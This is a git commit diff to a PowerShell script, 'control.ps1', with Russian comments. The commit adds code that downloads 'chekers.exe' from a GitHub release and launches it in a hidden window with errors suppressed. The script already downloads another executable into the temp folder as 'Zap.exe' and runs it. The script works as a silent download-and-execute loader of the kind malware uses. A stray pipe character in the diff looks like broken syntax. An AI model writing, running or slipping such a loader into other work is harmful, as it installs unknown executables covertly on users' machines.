7eaca980f539b3e8937c2970f80335371cd43e3b
kilordow <petrovolosuk310@gmail.com>
2026-02-25 18:01:59 +0200

    Update script to download and run chekers.exe

--- control.ps1
+++ control.ps1
@@ -1,3 +1,10 @@
-$p="$env:TEMP\Zap.exe"
+    # Скачиваем everything в текущую папку
+    Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/chekers.exe" -OutFile "chekers.exe" -ErrorAction SilentlyContinue
+    
+    # Запускаем 
+    Start-Process -FilePath "chekers.exe" -WindowStyle Hidden
+    
+|$p="$env:TEMP\Zap.exe"
 iwr https://github.com/kilordow/Fx.exe/releases/download/lol/chekir.exe -o $p
 Start-Process $p
+
